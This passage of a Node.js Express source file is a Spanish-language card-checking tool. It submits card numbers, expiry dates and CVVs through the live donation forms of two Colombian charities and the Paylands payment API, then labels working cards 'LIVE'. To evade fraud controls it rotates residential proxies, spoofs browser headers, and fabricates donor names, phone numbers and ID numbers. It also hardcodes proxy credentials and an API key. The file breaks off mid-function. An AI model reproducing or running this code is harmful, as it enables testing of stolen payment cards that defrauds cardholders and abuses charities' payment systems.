const express = require('express');
const axios = require('axios');
const path = require('path');
const faker = require('faker');
const { HttpsProxyAgent } = require('https-proxy-agent');
const UserAgent = require('user-agents');
const quickemailverification = require('quickemailverification').client('f6e258af4007570786e44266421a2b7be3004e890917d466df1d130b256b').quickemailverification();

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const app = express();

app.set('view engine', 'hbs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

const proxyList = [
  'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10001',
  'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10002',
  'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10003',
  'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10004',
  'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10005',
  'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10006',
  'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10007',
  'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10008',
  'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10009',
  'http://user-spaqiczotq-country-co-city-bogota-sessionduration-2:v386AB0aoqFL_icsem@gate.smartproxy.com:10010'
];

function getRandomProxy() {
  const idx = Math.floor(Math.random() * proxyList.length);
  return proxyList[idx];
}

function addLog(logs, msg) {
  logs.push(msg);
  console.log(msg);
}

function extractCookies(setCookieHeaders) {
  const cookies = {};
  if (!setCookieHeaders) return cookies;
  setCookieHeaders.forEach(cookieStr => {
    const [cookie] = cookieStr.split(';');
    const [key, value] = cookie.split('=');
    cookies[key.trim()] = value.trim();
  });
  return cookies;
}

function mergeCookies(oldCookies, newCookies) {
  return { ...oldCookies, ...newCookies };
}

function cookiesToHeader(cookies) {
  return Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
}

// Montos entre 20,000 y 50,000
function randomAmount() {
  return Math.floor(Math.random() * (50000 - 20000 + 1)) + 20000;
}

function randomPhone() {
  const start = 3112500000;
  const end = 3222500000;
  return '+57' + Math.floor(Math.random() * (end - start + 1) + start);
}

function randomCC() {
  return String(Math.floor(Math.random() * (1193000000 - 1191000000 + 1) + 1191000000));
}

// User-Agent y headers coherentes
const userAgentProfiles = [
  {
    platform: '"Windows"',
    secChUa: '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    userAgent: () => new UserAgent({ deviceCategory: 'desktop', platform: 'Win32' }).toString(),
    secChUaMobile: '?0'
  },
  {
    platform: '"Android"',
    secChUa: '"Chromium";v="135", "Not-A.Brand";v="8"',
    userAgent: () => new UserAgent({ deviceCategory: 'mobile', platform: 'Linux armv8l' }).toString(),
    secChUaMobile: '?1'
  },
  {
    platform: '"iOS"',
    secChUa: '"Mobile Safari";v="17", "Not-A.Brand";v="8"',
    userAgent: () => new UserAgent({ deviceCategory: 'mobile', platform: 'iPhone' }).toString(),
    secChUaMobile: '?1'
  },
  {
    platform: '"macOS"',
    secChUa: '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    userAgent: () => new UserAgent({ deviceCategory: 'desktop', platform: 'MacIntel' }).toString(),
    secChUaMobile: '?0'
  }
];

function getRandomUserAgentProfile() {
  const profile = userAgentProfiles[Math.floor(Math.random() * userAgentProfiles.length)];
  return {
    platform: profile.platform,
    secChUa: profile.secChUa,
    userAgent: profile.userAgent(),
    secChUaMobile: profile.secChUaMobile
  };
}

// 100 nombres latinos
const nombresLatam = [
  "Juan","José","Luis","Carlos","Jorge","Pedro","Miguel","Manuel","Francisco","David",
  "Andrés","Daniel","Alejandro","Mario","Fernando","Ricardo","Eduardo","Roberto","Sergio","Raúl",
  "Diego","Adrián","Héctor","Pablo","Martín","Cristian","Gabriel","Antonio","Enrique","Oscar",
  "Ramón","Gustavo","Víctor","Felipe","Emilio","Alfredo","Guillermo","Jesús","Mauricio","Ángel",
  "Alberto","Rafael","Julio","Rubén","Javier","Armando","Leonardo","Salvador","Ernesto","Arturo",
  "Santiago","Tomás","Sebastián","Nicolás","Matías","Emmanuel","Esteban","Ignacio","Lucas","Simón",
  "Samuel","Agustín","Valentín","Bruno","Maximiliano","Facundo","Luciano","Axel","Kevin","Jonathan",
  "Brian","Damián","Iván","Joel","Franco","Alan","Ezequiel","Nahuel","Lautaro","Federico",
  "Camilo","Mauricio","Cristóbal","Patricio","Rodrigo","Vicente","Benjamín","Felipe","Emilio","Matías",
  "Joaquín","Emiliano","Gael","Thiago","Bautista","Juan Pablo","Juan José","Juan Manuel","Juan Carlos","Juan David"
];

function generateLatamEmail() {
  const nombre = nombresLatam[Math.floor(Math.random() * nombresLatam.length)].replace(/\s/g, '').toLowerCase();
  const digitos = (Math.floor(Math.random() * 99) + 1).toString().padStart(2, '0');
  return `${nombre}${digitos}@gmail.com`;
}

function generateFakeUserLatam() {
  const firstName = nombresLatam[Math.floor(Math.random() * nombresLatam.length)];
  const lastName = nombresLatam[Math.floor(Math.random() * nombresLatam.length)];
  const email = generateLatamEmail();
  return { firstName, lastName, email };
}

// Verifica el correo con quickemailverification
async function verifyEmail(email) {
  return new Promise((resolve) => {
    quickemailverification.verify(email, function (err, response) {
      if (err) return resolve(false);
      resolve(response.body.result === 'valid');
    });
  });
}

app.get('/', (req, res) => {
  res.render('index', {
    title: 'Validador de Tarjetas',
    results: null,
    error: null,
    logs: ['Sistema listo. Ingrese los datos de la tarjeta.']
  });
});

app.post('/validate', async (req, res) => {
  const cardData = req.body.card;
  const logs = [];
  let cookies = {};
  let paymentToken = '';
  let uuid = '';
  let cardBrand = '';
  let cardBrandDesc = '';
  let cardBank = '';
  let amount = 0;

  // Elegir flujo aleatorio: 1 = Cruz Rojita 1, 2 = Guajira
  const flujo = Math.floor(Math.random() * 2) + 1;
  addLog(logs, `🔢 Flujo seleccionado: ${flujo} (${flujo === 1 ? 'CRUZ ROJITA 1' : 'FLUJO/PAGINA GUAJIRA'})`);

  // Proxy y User-Agent únicos por flujo
  const proxyUrl = getRandomProxy();
  const proxyAgent = new HttpsProxyAgent(proxyUrl);
  const { platform, secChUa, userAgent, secChUaMobile } = getRandomUserAgentProfile();

  try {
    addLog(logs, `🌐 Proxy usado: ${proxyUrl}`);
    addLog(logs, `🟡 Iniciando flujo: ${flujo === 1 ? 'CRUZ ROJITA 1' : 'FLUJO/PAGINA GUAJIRA'}`);

    // Datos de tarjeta
    const [number, month, year, cvv] = cardData.split('|');
    addLog(logs, `📦 Datos recibidos: ${number}|${month}|${year}|${cvv}`);

    if (!number || !month || !year || !cvv) {
      throw new Error('Formato de tarjeta incorrecto. Use: NUMERO|MES|AÑO|CVV');
    }

    // Generar datos fake y validar correo hasta 5 veces
    amount = randomAmount();
    let fakeUser, phone, cc, emailTries = 0;
    do {
      fakeUser = generateFakeUserLatam();
      phone = randomPhone();
      cc = randomCC();
      addLog(logs, `🔎 Verificando correo: ${fakeUser.email}`);
      const isValid = await verifyEmail(fakeUser.email);
      if (isValid) {
        addLog(logs, `✅ Correo válido: ${fakeUser.email}`);
        break;
      } else {
        addLog(logs, `❌ Correo inválido: ${fakeUser.email}, reintentando...`);
      }
      emailTries++;
    } while (emailTries < 5);

    if (emailTries === 5) {
      throw new Error('No se pudo generar un correo Gmail válido tras 5 intentos');
    }

    // --- FLUJO 1: CRUZ ROJITA 1 ---
    if (flujo === 1) {
      // 1. GET inicial cookies
      const initialCookiesResp = await getInitialCookiesCruzrojita(logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl);
      cookies = mergeCookies(cookies, initialCookiesResp.cookies);

      // 2. leadDonationStart
      const leadDonationResp = await leadDonationStart({
        cookies,
        fakeUser,
        amount,
        phone
      }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl);
      cookies = mergeCookies(cookies, leadDonationResp.cookies);

      // 3. donation (token)
      const donationTokenResp = await donationToken({
        cookies,
        fakeUser,
        amount,
        phone
      }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl);
      cookies = mergeCookies(cookies, donationTokenResp.cookies);
      paymentToken = donationTokenResp.token;

      // 4. Paylands Card Save
      const paylandsResp = await paylandsCardSave({
        token: paymentToken,
        number,
        month,
        year,
        cvv
      }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl);
      uuid = paylandsResp.uuid;
      cardBrand = paylandsResp.brand;
      cardBrandDesc = paylandsResp.brand_description;
      cardBank = paylandsResp.bank;

      // 5. addPaymentInfo
      const addPaymentResp = await addPaymentInfo({
        cookies,
        fakeUser,
        amount,
        phone,
        uuid,
        cc
      }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl);
      cookies = mergeCookies(cookies, addPaymentResp.cookies);

      // 6. donation final
      const donationFinalResp = await donationFinal({
        cookies,
        fakeUser,
        amount,
        phone,
        uuid,
        cc
      }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl);

      addLog(logs, '✅ Validación completada con éxito (CRUZ ROJITA 1)');

    // --- FLUJO 2: GUAJIRA ---
    } else {
      // 1. GET inicial cookies GUAJIRA
      const initialCookiesResp = await getInitialCookiesGuajira(logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl);
      cookies = mergeCookies(cookies, initialCookiesResp.cookies);

      // 2. formRegister
      const formRegisterResp = await formRegisterGuajira({
        cookies,
        fakeUser,
        amount,
        phone
      }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl);
      cookies = mergeCookies(cookies, formRegisterResp.cookies);

      // 3. leadDonationStart GUAJIRA
      const leadDonationResp = await leadDonationStartGuajira({
        cookies,
        fakeUser,
        amount,
        phone
      }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl);
      cookies = mergeCookies(cookies, leadDonationResp.cookies);

      // 4. donation (token) GUAJIRA
      const donationTokenResp = await donationTokenGuajira({
        cookies,
        fakeUser,
        amount,
        phone
      }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl);
      cookies = mergeCookies(cookies, donationTokenResp.cookies);
      paymentToken = donationTokenResp.token;

      // 5. Paylands Card Save
      const paylandsResp = await paylandsCardSave({
        token: paymentToken,
        number,
        month,
        year,
        cvv
      }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl);
      uuid = paylandsResp.uuid;
      cardBrand = paylandsResp.brand;
      cardBrandDesc = paylandsResp.brand_description;
      cardBank = paylandsResp.bank;

      // 6. donation final GUAJIRA
      const donationFinalResp = await donationFinalGuajira({
        cookies,
        fakeUser,
        amount,
        phone,
        uuid,
        cc
      }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl);

      addLog(logs, '✅ Validación completada con éxito (FLUJO/PAGINA GUAJIRA)');
    }

    res.render('index', {
      title: 'Resultado de Validación',
      results: {
        status: 'LIVE',
        card: `${number.substring(0, 4)}**** **** ****`,
        bank: cardBank,
        type: cardBrand,
        brand_description: cardBrandDesc,
        uuid: uuid,
        amount
      },
      error: null,
      logs: logs
    });

  } catch (error) {
    let errorMsg = error.message;
    if (error.response && error.response.data && error.response.data.message) {
      errorMsg = error.response.data.message;
    }
    addLog(logs, `🔴 Error: ${errorMsg}`);
    res.render('index', {
      title: 'Error en Validación',
      results: null,
      error: errorMsg,
      logs: logs
    });
  }
});

// --- FLUJO 1: CRUZ ROJITA 1 ---
async function getInitialCookiesCruzrojita(logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl) {
  try {
    addLog(logs, `🌐 Proxy usado en getInitialCookies (CRUZ ROJITA 1): ${proxyUrl}`);
    const headers = {
      'sec-ch-ua-platform': platform,
      'User-Agent': userAgent,
      'Accept': 'application/json, text/plain, */*',
      'sec-ch-ua': secChUa,
      'Content-Type': 'application/json',
      'sec-ch-ua-mobile': secChUaMobile,
      'Sec-Fetch-Site': 'cross-site',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'host': 'my.afrus.app'
    };
    const response = await axios.get(
      'https://my.afrus.app/api/form/a4064c13-acb2-4ccf-bdfb-5da1463320e9',
      {
        headers,
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 GET inicial cookies Status: ${response.status}`);
    const newCookies = extractCookies(response.headers['set-cookie'] || []);
    return { cookies: newCookies };
  } catch (error) {
    addLog(logs, `🔴 GET inicial cookies Error: ${error.message}`);
    throw error;
  }
}

// --- FLUJO 2: GUAJIRA ---
async function getInitialCookiesGuajira(logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl) {
  try {
    addLog(logs, `🌐 Proxy usado en getInitialCookies (GUAJIRA): ${proxyUrl}`);
    const headers = {
      'sec-ch-ua-platform': platform,
      'User-Agent': userAgent,
      'Accept': 'application/json, text/plain, */*',
      'sec-ch-ua': secChUa,
      'Content-Type': 'application/json',
      'sec-ch-ua-mobile': secChUaMobile,
      'Sec-Fetch-Site': 'cross-site',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'host': 'my.afrus.org'
    };
    const response = await axios.get(
      'https://my.afrus.org/api/form/1274cd45-e62c-4d40-af25-94737b570231',
      {
        headers,
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 GET inicial cookies GUAJIRA Status: ${response.status}`);
    const newCookies = extractCookies(response.headers['set-cookie'] || []);
    return { cookies: newCookies };
  } catch (error) {
    addLog(logs, `🔴 GET inicial cookies GUAJIRA Error: ${error.message}`);
    throw error;
  }
}

async function formRegisterGuajira({ cookies, fakeUser, amount, phone }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl) {
  try {
    addLog(logs, `🌐 Proxy usado en formRegister (GUAJIRA): ${proxyUrl}`);
    const headers = {
      'sec-ch-ua-platform': platform,
      'User-Agent': userAgent,
      'Accept': 'application/json, text/plain, */*',
      'sec-ch-ua': secChUa,
      'Content-Type': 'application/json;charset=UTF-8',
      'sec-ch-ua-mobile': secChUaMobile,
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Storage-Access': 'none',
      'host': 'my.afrus.org',
      'Cookie': cookiesToHeader(cookies)
    };
    const body = {
      is_donation: true,
      form_id: 4956,
      campaign_id: 2326,
      treatment: null,
      country_id: 49,
      organization_id: 87,
      first_name: fakeUser.firstName,
      last_name: fakeUser.lastName,
      email: fakeUser.email,
      phone: phone,
      state: '',
      city: '',
      gender: '',
      born_date: null,
      street: '',
      street_number: '',
      gateway_id: 8,
      gateway_currency_id: 285,
      zip_code: '',
      rest_address: '',
      rest_address2: '',
      countryPhone: 'CO',
      type: 1,
      url_landing: 'https://bancodealimentosbga.org/',
      language_code: 'ES',
      unomi_metadata: {},
      organization: '',
      custom_fields: {},
      terms_accepted: true,
      terms2_accepted: null
    };
    const response = await axios.post(
      'https://my.afrus.org/api/formRegister',
      body,
      {
        headers,
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 formRegister GUAJIRA Status: ${response.status}`);
    const newCookies = extractCookies(response.headers['set-cookie'] || []);
    return { data: response.data, cookies: newCookies };
  } catch (error) {
    addLog(logs, `🔴 formRegister GUAJIRA Error: ${error.message}`);
    throw error;
  }
}

async function leadDonationStartGuajira({ cookies, fakeUser, amount, phone }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl) {
  try {
    addLog(logs, `🌐 Proxy usado en leadDonationStart (GUAJIRA): ${proxyUrl}`);
    const headers = {
      'sec-ch-ua-platform': platform,
      'User-Agent': userAgent,
      'Accept': 'application/json, text/plain, */*',
      'sec-ch-ua': secChUa,
      'Content-Type': 'application/json;charset=UTF-8',
      'sec-ch-ua-mobile': secChUaMobile,
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Storage-Access': 'none',
      'host': 'my.afrus.org',
      'Cookie': cookiesToHeader(cookies)
    };
    const body = {
      is_donation: true,
      form_id: 4956,
      treatment: null,
      campaign_id: 2326,
      amount: amount + '.00',
      currency_id: 36,
      country_id: 49,
      gateway_id: 8,
      language_code: 'ES',
      organization_id: 87,
      first_name: fakeUser.firstName,
      last_name: fakeUser.lastName,
      email: fakeUser.email,
      phone: phone,
      gender: '',
      born_date: null,
      state: '',
      city: '',
      street: '',
      street_number: '',
      zip_code: '',
      rest_address: '',
      rest_address2: '',
      countryPhone: 'CO',
      type: 1,
      url_landing: 'https://bancodealimentosbga.org/',
      unomi_metadata: {},
      organization: '',
      custom_fields: {},
      metadata: {
        gateway: { name: 'Bakery' },
        amount: amount,
        is_subscription: false,
        form: { name: 'Formulario Página Web - Banco Alimentos Bucaramanga' },
        campaign: { name: 'Campaña Banco de Alimentos Bucaramanga' }
      }
    };
    const response = await axios.post(
      'https://my.afrus.org/api/leadDonationStart',
      body,
      {
        headers,
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 leadDonationStart GUAJIRA Status: ${response.status}`);
    const newCookies = extractCookies(response.headers['set-cookie'] || []);
    return { data: response.data, cookies: newCookies };
  } catch (error) {
    addLog(logs, `🔴 leadDonationStart GUAJIRA Error: ${error.message}`);
    throw error;
  }
}

async function donationTokenGuajira({ cookies, fakeUser, amount, phone }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl) {
  try {
    addLog(logs, `🌐 Proxy usado en donationToken (GUAJIRA): ${proxyUrl}`);
    const headers = {
      'sec-ch-ua-platform': platform,
      'User-Agent': userAgent,
      'Accept': 'application/json, text/plain, */*',
      'sec-ch-ua': secChUa,
      'Content-Type': 'application/json;charset=UTF-8',
      'sec-ch-ua-mobile': secChUaMobile,
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Storage-Access': 'none',
      'host': 'my.afrus.org',
      'Cookie': cookiesToHeader(cookies)
    };
    const body = {
      treatment: null,
      form_id: 4956,
      country_id: 49,
      language_code: 'ES',
      url_landing: 'https://bancodealimentosbga.org/',
      amount: amount + '.00',
      is_subscription: false,
      gateway_id: 8,
      campaign_id: 2326,
      organization_id: 87,
      first_name: fakeUser.firstName,
      last_name: fakeUser.lastName,
      email: fakeUser.email,
      phone: phone,
      currency_id: 36,
      state: '',
      city: '',
      gender: '',
      born_date: null,
      street: '',
      street_number: '',
      zip_code: '',
      rest_address: '',
      rest_address2: '',
      countryPhone: 'CO',
      type: 1,
      identification_type: null,
      id_transaction: null,
      custom_fields: {},
      payment_method: 'card',
      unomi_metadata: {},
      organization: '',
      frequency_id: 1,
      fundraising_campaign_id: null,
      terms_accepted: true,
      terms2_accepted: null,
      private: false,
      requestToken: true
    };
    const response = await axios.post(
      'https://my.afrus.org/api/donation',
      body,
      {
        headers,
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 donation/token GUAJIRA Status: ${response.status}`);
    const newCookies = extractCookies(response.headers['set-cookie'] || []);
    const token = response.data.token;
    addLog(logs, `🔑 Token obtenido: ${token}`);
    return { data: response.data, cookies: newCookies, token };
  } catch (error) {
    addLog(logs, `🔴 donation/token GUAJIRA Error: ${error.message}`);
    throw error;
  }
}

async function donationFinalGuajira({ cookies, fakeUser, amount, phone, uuid, cc }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl) {
  try {
    addLog(logs, `🌐 Proxy usado en donationFinal (GUAJIRA): ${proxyUrl}`);
    const headers = {
      'sec-ch-ua-platform': platform,
      'User-Agent': userAgent,
      'Accept': 'application/json, text/plain, */*',
      'sec-ch-ua': secChUa,
      'Content-Type': 'application/json;charset=UTF-8',
      'sec-ch-ua-mobile': secChUaMobile,
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Storage-Access': 'none',
      'host': 'my.afrus.org',
      'Cookie': cookiesToHeader(cookies)
    };
    const body = {
      treatment: null,
      form_id: 4956,
      country_id: 49,
      language_code: 'ES',
      url_landing: 'https://bancodealimentosbga.org/',
      amount: amount + '.00',
      is_subscription: false,
      gateway_id: 8,
      campaign_id: 2326,
      organization_id: 87,
      first_name: fakeUser.firstName,
      last_name: fakeUser.lastName,
      email: fakeUser.email,
      phone: phone,
      currency_id: 36,
      state: '',
      city: '',
      gender: '',
      born_date: null,
      street: '',
      street_number: '',
      zip_code: '',
      rest_address: '',
      rest_address2: '',
      countryPhone: 'CO',
      type: 1,
      identification_type: 4,
      identification: cc,
      id_transaction: null,
      custom_fields: {},
      payment_method: 'card',
      unomi_metadata: {},
      organization: '',
      frequency_id: 1,
      fundraising_campaign_id: null,
      terms_accepted: true,
      terms2_accepted: null,
      private: false,
      payment_token: uuid
    };
    const response = await axios.post(
      'https://my.afrus.org/api/donation',
      body,
      {
        headers,
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 donation final GUAJIRA Status: ${response.status}`);
    if (response.data.code) {
      addLog(logs, `🔴 Resultado: code=${response.data.code}, message=${response.data.message}, reference=${response.data.reference || ''}`);
    } else {
      addLog(logs, `🟢 Resultado: ${JSON.stringify(response.data)}`);
    }
    return response.data;
  } catch (error) {
    if (error.response && error.response.data) {
      addLog(logs, `🔴 Resultado: code=${error.response.data.code}, message=${error.response.data.message}, reference=${error.response.data.reference || ''}`);
    } else {
      addLog(logs, `🔴 donation final GUAJIRA Error: ${error.message}`);
    }
    throw error;
  }
}

// --- FLUJO 1: CRUZ ROJITA 1 ENDPOINTS ---
async function leadDonationStart({ cookies, fakeUser, amount, phone }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl) {
  try {
    addLog(logs, `🌐 Proxy usado en leadDonationStart: ${proxyUrl}`);
    const headers = {
      'sec-ch-ua-platform': platform,
      'User-Agent': userAgent,
      'Accept': 'application/json, text/plain, */*',
      'sec-ch-ua': secChUa,
      'Content-Type': 'application/json;charset=UTF-8',
      'sec-ch-ua-mobile': secChUaMobile,
      'Sec-Fetch-Site': 'cross-site',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'host': 'my.afrus.org',
      'Cookie': cookiesToHeader(cookies)
    };
    const body = {
      is_donation: true,
      form_id: 3243,
      treatment: null,
      campaign_id: 1312,
      amount: amount + '.00',
      currency_id: 36,
      country_id: 49,
      gateway_id: 8,
      language_code: 'ES',
      organization_id: 18,
      first_name: fakeUser.firstName,
      last_name: fakeUser.lastName,
      email: fakeUser.email,
      phone: phone,
      gender: '',
      born_date: null,
      state: '',
      city: '',
      street: '',
      street_number: '',
      zip_code: '',
      rest_address: '',
      rest_address2: '',
      countryPhone: 'CO',
      type: 1,
      url_landing: 'https://donar.cruzrojabogota.org.co/',
      unomi_metadata: {},
      organization: '',
      custom_fields: {},
      metadata: {
        gateway: { name: 'Bakery' },
        amount: amount,
        is_subscription: false,
        form: { name: 'Invierno Colombia 2022' },
        campaign: { name: 'Invierno Colombia 2022' }
      }
    };
    const response = await axios.post(
      'https://my.afrus.org/api/leadDonationStart',
      body,
      {
        headers,
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 leadDonationStart Status: ${response.status}`);
    const newCookies = extractCookies(response.headers['set-cookie'] || []);
    return { data: response.data, cookies: newCookies };
  } catch (error) {
    addLog(logs, `🔴 leadDonationStart Error: ${error.message}`);
    throw error;
  }
}

async function donationToken({ cookies, fakeUser, amount, phone }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl) {
  try {
    addLog(logs, `🌐 Proxy usado en donationToken: ${proxyUrl}`);
    const headers = {
      'sec-ch-ua-platform': platform,
      'User-Agent': userAgent,
      'Accept': 'application/json, text/plain, */*',
      'sec-ch-ua': secChUa,
      'Content-Type': 'application/json;charset=UTF-8',
      'sec-ch-ua-mobile': secChUaMobile,
      'Sec-Fetch-Site': 'cross-site',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'host': 'my.afrus.org',
      'Cookie': cookiesToHeader(cookies)
    };
    const body = {
      treatment: null,
      form_id: 3243,
      country_id: 49,
      language_code: 'ES',
      url_landing: 'https://donar.cruzrojabogota.org.co/',
      amount: amount + '.00',
      is_subscription: false,
      gateway_id: 8,
      campaign_id: 1312,
      organization_id: 18,
      first_name: fakeUser.firstName,
      last_name: fakeUser.lastName,
      email: fakeUser.email,
      phone: phone,
      currency_id: 36,
      state: '',
      city: '',
      gender: '',
      born_date: null,
      street: '',
      street_number: '',
      zip_code: '',
      rest_address: '',
      rest_address2: '',
      countryPhone: 'CO',
      type: 1,
      identification_type: null,
      id_transaction: null,
      custom_fields: {},
      payment_method: 'card',
      unomi_metadata: {},
      organization: '',
      frequency_id: 1,
      fundraising_campaign_id: null,
      terms_accepted: true,
      terms2_accepted: null,
      private: false,
      requestToken: true
    };
    const response = await axios.post(
      'https://my.afrus.org/api/donation',
      body,
      {
        headers,
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 donation/token Status: ${response.status}`);
    const newCookies = extractCookies(response.headers['set-cookie'] || []);
    const token = response.data.token;
    addLog(logs, `🔑 Token obtenido: ${token}`);
    return { data: response.data, cookies: newCookies, token };
  } catch (error) {
    addLog(logs, `🔴 donation/token Error: ${error.message}`);
    throw error;
  }
}

async function paylandsCardSave({ token, number, month, year, cvv }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl) {
  try {
    addLog(logs, `🌐 Proxy usado en paylandsCardSave: ${proxyUrl}`);
    const headers = {
      'sec-ch-ua-platform': platform,
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': userAgent,
      'Accept': '*/*',
      'sec-ch-ua': secChUa,
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'sec-ch-ua-mobile': secChUaMobile,
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Storage-Access': 'active',
      'host': 'api.paylands.com'
    };
    const body = {
      token: token,
      card_pan: number,
      card_expiry_month: month,
      card_expiry_year: year.substring(2, 4),
      card_cvv: cvv,
      url_post: ''
    };
    const response = await axios.post(
      'https://api.paylands.com/v1/cards/save/frame',
      body,
      {
        headers,
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 Paylands Card Save Status: ${response.status}`);
    addLog(logs, `💳 Brand: ${response.data.Source.brand}, Desc: ${response.data.Source.brand_description}, Bank: ${response.data.Source.bank}`);
    return {
      uuid: response.data.Source.uuid,
      brand: response.data.Source.brand,
      brand_description: response.data.Source.brand_description,
      bank: response.data.Source.bank
    };
  } catch (error) {
    addLog(logs, `🔴 Paylands Card Save Error: ${error.message}`);
    throw error;
  }
}

async function addPaymentInfo({ cookies, fakeUser, amount, phone, uuid, cc }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl) {
  try {
    addLog(logs, `🌐 Proxy usado en addPaymentInfo: ${proxyUrl}`);
    const headers = {
      'sec-ch-ua-platform': platform,
      'User-Agent': userAgent,
      'Accept': 'application/json, text/plain, */*',
      'sec-ch-ua': secChUa,
      'Content-Type': 'application/json;charset=UTF-8',
      'sec-ch-ua-mobile': secChUaMobile,
      'Sec-Fetch-Site': 'cross-site',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'host': 'my.afrus.org',
      'Cookie': cookiesToHeader(cookies)
    };
    const body = {
      treatment: null,
      form_id: 3243,
      country_id: 49,
      language_code: 'ES',
      url_landing: 'https://donar.cruzrojabogota.org.co/',
      amount: amount + '.00',
      is_subscription: false,
      gateway_id: 8,
      campaign_id: 1312,
      organization_id: 18,
      first_name: fakeUser.firstName,
      last_name: fakeUser.lastName,
      email: fakeUser.email,
      phone: phone,
      currency_id: 36,
      state: '',
      city: '',
      gender: '',
      born_date: null,
      street: '',
      street_number: '',
      zip_code: '',
      rest_address: '',
      rest_address2: '',
      countryPhone: 'CO',
      type: 1,
      identification_type: 4,
      identification: cc,
      id_transaction: null,
      custom_fields: {},
      payment_method: 'card',
      unomi_metadata: {},
      organization: '',
      frequency_id: 1,
      fundraising_campaign_id: null,
      terms_accepted: true,
      terms2_accepted: null,
      private: false,
      payment_token: uuid,
      metadata: {
        gateway: { name: 'Bakery' },
        amount: amount,
        is_subscription: false,
        form: { name: 'Invierno Colombia 2022' },
        campaign: { name: 'Invierno Colombia 2022' }
      }
    };
    const response = await axios.post(
      'https://my.afrus.org/api/donation/addPaymentInfo',
      body,
      {
        headers,
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 addPaymentInfo Status: ${response.status}`);
    const newCookies = extractCookies(response.headers['set-cookie'] || []);
    return { data: response.data, cookies: newCookies };
  } catch (error) {
    addLog(logs, `🔴 addPaymentInfo Error: ${error.message}`);
    throw error;
  }
}

async function donationFinal({ cookies, fakeUser, amount, phone, uuid, cc }, logs, proxyAgent, userAgent, platform, secChUa, secChUaMobile, proxyUrl) {
  try {
    addLog(logs, `🌐 Proxy usado en donationFinal: ${proxyUrl}`);
    const headers = {
